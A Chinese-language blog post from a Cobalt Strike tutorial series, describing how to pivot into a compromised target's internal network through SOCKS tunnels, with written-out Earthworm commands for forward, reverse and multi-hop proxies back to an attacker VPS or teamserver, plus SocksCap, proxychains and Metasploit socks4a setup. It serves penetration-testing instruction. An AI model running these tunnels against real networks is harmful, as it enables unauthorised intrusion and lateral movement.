<!DOCTYPE html><html class="appearance-auto" lang="cn"><head><meta charset="UTF-8"><title>Cobaltstrike系列教程(九)内置Socks与神器EW</title><meta name="description" content="J0o1ey Blog | Hack for Sec and Good"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="0x01-Socks概念目前利用网络防火墙将组织内部的网络结构与外部网络如 INTERNET 中有效地隔离开来，这种方法正变得逐渐流行起来。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET 、 FTP 、 SMTP 等的接入。 SOCKS 提供一个通用框架来使这些协议安全透明地穿过防火墙。说的简单明了一点，在渗透测试中，我们使用socks技术，可以穿透进入目标机的内网，从而扩大我们的战果
0x002-Cobaltstrike自带Socks功能选择一个beacon，右键，中转–&amp;gt;SOCKS Server，或使用命令socks [port]
弹出一个窗口，按要求配置好代理端口
如图，成功开启socks 4，连接我们teamserver的5126端口，即可进入目标机内网~
0x0.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">J0o1ey's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Cobaltstrike系列教程(九)内置Socks与神器EW</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Socks%E6%A6%82%E5%BF%B5"><span class="toc-text">0x01-Socks概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x002-Cobaltstrike%E8%87%AA%E5%B8%A6Socks%E5%8A%9F%E8%83%BD"><span class="toc-text">0x002-Cobaltstrike自带Socks功能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%BD%BF%E7%94%A8ew-SocksCap%E7%A9%BF%E9%80%8F%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%86%85%E7%BD%91"><span class="toc-text">0x03-使用ew+SocksCap穿透到目标机内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0Earthworm-%E4%B8%8B%E8%BD%BD%E8%A7%81%E6%96%87%E6%9C%AB"><span class="toc-text">①Earthworm(下载见文末)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91socks-v5%E6%9C%8D%E5%8A%A1%E5%99%A8-%E3%80%90%E9%80%82%E7%94%A8%E4%BA%8E%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%8B%A5%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%96%E7%BD%91IP%E3%80%91"><span class="toc-text">正向socks v5服务器        【适用于目标机拥有一个外网IP】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9socks-v5%E6%9C%8D%E5%8A%A1%E5%99%A8-%E3%80%90%E9%80%82%E7%94%A8%E4%BA%8E%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91IP%EF%BC%8C%E4%BD%86%E5%8F%AF%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90%E3%80%91"><span class="toc-text">反弹socks v5服务器        【适用于目标机器没有公网IP，但可访问内网资源】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-text">二级网络环境（一）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-text">二级网络环境（二）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="toc-text">三级网络环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF"><span class="toc-text">实战场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E4%BD%BF%E7%94%A8SocksCap%E8%BF%9E%E6%8E%A5socks"><span class="toc-text">②使用SocksCap连接socks</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x004-%E5%9C%A8Kali%E4%B8%ADMetasploit%E4%BD%BF%E7%94%A8socks%E9%80%9A%E9%81%93"><span class="toc-text">0x004-在Kali中Metasploit使用socks通道</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7"><i class="tag post-item-tag">安全工具</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Cobaltstrike系列教程(九)内置Socks与神器EW</h1><time class="has-text-grey" datetime="2019-06-16T04:43:38.000Z">2019-06-16</time><article class="mt-2 post-content"><h2 id="0x01-Socks概念"><a href="#0x01-Socks概念" class="headerlink" title="0x01-Socks概念"></a>0x01-Socks概念</h2><p>目前利用网络防火墙将组织内部的网络结构与外部网络如 INTERNET 中有效地隔离开来，这种方法正变得逐渐流行起来。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET 、 FTP 、 SMTP 等的接入。 SOCKS 提供一个通用框架来使这些协议安全透明地穿过防火墙。<br>说的简单明了一点，在渗透测试中，我们使用socks技术，可以穿透进入目标机的内网，从而扩大我们的战果<br><img src="/"></p>
<h2 id="0x002-Cobaltstrike自带Socks功能"><a href="#0x002-Cobaltstrike自带Socks功能" class="headerlink" title="0x002-Cobaltstrike自带Socks功能"></a>0x002-Cobaltstrike自带Socks功能</h2><p>选择一个beacon，右键，中转–&gt;SOCKS Server，或使用命令socks [port]<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542627.png" alt="image"></p>
<p>弹出一个窗口，按要求配置好代理端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542560.png" alt="image"></p>
<p>如图，成功开启socks 4，连接我们teamserver的5126端口，即可进入目标机内网~<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542192.png" alt="image"></p>
<h2 id="0x03-使用ew-SocksCap穿透到目标机内网"><a href="#0x03-使用ew-SocksCap穿透到目标机内网" class="headerlink" title="0x03-使用ew+SocksCap穿透到目标机内网"></a>0x03-使用ew+SocksCap穿透到目标机内网</h2><h3 id="①Earthworm-下载见文末"><a href="#①Earthworm-下载见文末" class="headerlink" title="①Earthworm(下载见文末)"></a>①Earthworm(下载见文末)</h3><p>Ew(Earthworm)是一款当之无愧的内网穿透大杀器，应用的平台非常广泛，包括</p>
<pre><code>ew_for_Win.exe        适用各种Windows系统(X86指令集、X64指令集)        Windows7、Windows XP
ew_for_Linux32        各常见Linux发行版 (X86 指令集 CPU)        Ubuntu(X86)/BT5(X86)
ew_for_linux64        各常见Linux发行版 (X64 指令集 CPU)        Ubuntu(X64)/Kali(X64)
ew_for_MacOSX64        MacOS系统发行版 (X64 指令集)        苹果PC电脑，苹果server
ew_for_Arm32        常见Arm-Linux系统        HTC New One(Arm-Android)/小米路由器(R1D)
ew_mipsel        常见Mips-Linux系统 (Mipsel指令集 CPU)        萤石硬盘录像机、小米mini路由器(R1CM)
</code></pre>
<p>下面简单讲一下它的应用场景和命令<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542432.png" alt="image"></p>
<h3 id="正向socks-v5服务器-【适用于目标机拥有一个外网IP】"><a href="#正向socks-v5服务器-【适用于目标机拥有一个外网IP】" class="headerlink" title="正向socks v5服务器        【适用于目标机拥有一个外网IP】"></a>正向socks v5服务器        【适用于目标机拥有一个外网IP】</h3><p>服务器端执行以下命令<br>ew.exe -s ssocksd -l 888</p>
<p>说明：服务器开启端口为888，SOCKS的代理。然后使用sockscap64添加这个IP的代理就可以使用了。</p>
<h3 id="反弹socks-v5服务器-【适用于目标机器没有公网IP，但可访问内网资源】"><a href="#反弹socks-v5服务器-【适用于目标机器没有公网IP，但可访问内网资源】" class="headerlink" title="反弹socks v5服务器        【适用于目标机器没有公网IP，但可访问内网资源】"></a>反弹socks v5服务器        【适用于目标机器没有公网IP，但可访问内网资源】</h3><p>本地执行以下命令<br>ew.exe -s rcsocks -l 1008 -e 888</p>
<p>说明：该命令的意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给888端口。</p>
<p>服务器端执行以下命令<br>ew.exe -s rssocks -d 2.2.2.2 -e 888</p>
<p>说明：该命令的意思是在服务器上启动SOCKS V5服务，并反弹到IP地址为2.2.2.2的服务器888端口上。</p>
<h3 id="二级网络环境（一）"><a href="#二级网络环境（一）" class="headerlink" title="二级网络环境（一）"></a>二级网络环境（一）</h3><p>假设我们获得了右侧A主机和B主机的控制权<br>A主机配有2块网卡，一块连通外网，一块10.48.128.25只能连接内网B主机，无法访问内网其它资源。<br>B主机可以访问内网资源，但无法访问外网。</p>
<p>A.先上传ew到B主机，利用ssocksd方式启动888端口的SOCKS代理，命令如下：<br>ew -s ssocksd -l 888</p>
<p>B.上传ew到右侧A主机，运行下列命令：<br>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</p>
<p>说明：该命令意思是将1080端口收到的代理请求转交给B主机（10.48.128.49）的888端口。</p>
<p>C.可以通过访问A主机外网139.XXX.XX.113:1080来使用在B主机架设的socks5代理。</p>
<h3 id="二级网络环境（二）"><a href="#二级网络环境（二）" class="headerlink" title="二级网络环境（二）"></a>二级网络环境（二）</h3><p>假设我们获得了右侧A主机和B主机的控制权限。<br>A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p>
<p>这个操作分为4步，用到lcx_listen和lcx_slave命令：</p>
<p>A. 先上传ew 到左侧公网VPS上，运行下列命令：<br>ew –s lcx_listen –l 10800 –e 888<br>说明：该命令意思是在公网VPS添加转接隧道，将10800端口收到的代理请求转交给888端口。</p>
<p>B.上传ew到B主机，并利用ssocksd方式启动999端口的socks代理，命令如下：<br>ew -s ssocksd -l 999</p>
<p>C.上传ew 到A主机，运行下列命令：<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.49 -g 999<br>说明：该命令意思是在A主机上利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来。</p>
<p>D. 返回我们公网VPS的CMD界面下，可以看到已经连接成功了。<br>现在就可以通过访问公网VPS地址 139.XXX.XX.113:10800来使用在B主机架设的socks5代理。</p>
<h3 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h3><p>三级网络环境在实际渗透中用的比较少，也比较复杂，现在我们来一个个的讲解下三级级联的用法。</p>
<p>假设渗透场景：<br>内网A主机没有公网IP但可以访问外网<br>B主机不能访问外网但可以被A主机访问、C主机可被B主机访问而且能够访问核心区域。</p>
<p>A.在左侧公网VPS上运行命令，将1080端口收到的代理请求转交给888端口：<br>ew -s rcsocks -l 1080 -e 888</p>
<p>B.在A主机上运行命令，将公网VPS的888端口和B主机的999端口连接起来：<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999</p>
<p>C.在B主机上运行命令，将999端口收到的代理请求转交给777端口：<br>ew -s lcx_listen -l 999 -e 777</p>
<p>D.在C主机上启动SOCKS V5服务，并反弹到B主机的777端口上，命令如下。<br>ew -s rssocks -d 10.48.128.12 -e 777</p>
<p>E.在MY PC上可以通过访问公网VPS 139.XXX.XX.113:1080来使用在C主机架设的socks5代理。</p>
<p>整个数据流向是：SOCKS V5 → 1080 → 888 →999 →777 → rssocks</p>
<h2 id="实战场景"><a href="#实战场景" class="headerlink" title="实战场景"></a>实战场景</h2><p>本次测试目标机器没有公网IP，但可访问内网资源<br>1.我们在teamserver上运行以下命令<br>ew.exe -s rcsocks -l 1008 -e 888<br>接受888端口数据，然后转发到1008端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542245.png" alt="image"></p>
<p>2.然后我们在目标机上传ew，然后在cs中执行<br>ew.exe -s rssocks -d 2.2.2.2 -e 888（2.2.2.2为teamserver）<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542860.png" alt="image"></p>
<p>3.随后，我们的teamserver就会显示连接成功<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542807.png" alt="image"></p>
<h3 id="②使用SocksCap连接socks"><a href="#②使用SocksCap连接socks" class="headerlink" title="②使用SocksCap连接socks"></a>②使用SocksCap连接socks</h3><p>根据自己的Windows版本以管理员模式运行SocksCap后<br>点击代理，然后添加自己teamserver的ip和刚刚转发出来的端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542246.png" alt="image"></p>
<p>在这里把代理切换成刚刚添加的<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542779.png" alt="image"></p>
<p>右键，添加一个exe文件，根据你的需求，添加要在socks隧道中运行的程序</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543208.png" alt="image"></p>
<p>选择程序，右键–&gt;在代理隧道中运行选中程序，该程序即可通过socks进入目标内网</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543868.png" alt="image"></p>
<p>如图，为连入socks通道的cmd ping目标机的某内网ip<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543675.png" alt="image"></p>
<h2 id="0x004-在Kali中Metasploit使用socks通道"><a href="#0x004-在Kali中Metasploit使用socks通道" class="headerlink" title="0x004-在Kali中Metasploit使用socks通道"></a>0x004-在Kali中Metasploit使用socks通道</h2><p>1.使用cs搭建好socks4通道后，首先配置神器proxychains<br>在&#x2F;etc&#x2F;proxychains.conf配置文件中添加新的代理服务器。通过激活动态链设置，确保在不同的代理服务器之间能够正常切换。</p>
<pre><code>root@kali:~# cat /etc/proxychains.conf | grep -v &quot;#&quot;
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks4  172.16.0.20 1080  # socks4通道的IP及端口
</code></pre>
<p>然后在MSF中，配置socks4隧道即可让MSF进入目标机内网大杀四方<br>(2.2.2.2为teamserver的ip，1081为socks端口)</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a
msf auxiliary(socks4a) &gt; set SRVHOST 2.2.2.2
msf auxiliary(socks4a) &gt; set SRVPORT 1081
SRVPORT =&gt; 1081
msf auxiliary(socks4a) &gt; run
Auxiliary module execution completed
Starting the socks4a proxy server
msf auxiliary(socks4a) &gt;
</code></pre>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543028.png" alt="image"></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81-%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95/" title="Cobaltstrike系列教程(十)安装扩展"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Cobaltstrike系列教程(十)安装扩展</span></a><a class="button is-default" href="/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AB-%E6%88%AA%E5%9B%BE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86/" title="Cobaltstrike系列教程(八)截图与浏览器代理"><span class="has-text-weight-semibold">Next: Cobaltstrike系列教程(八)截图与浏览器代理</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="j0o1ey/j0o1ey.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/j0o1ey"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> J0o1ey 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>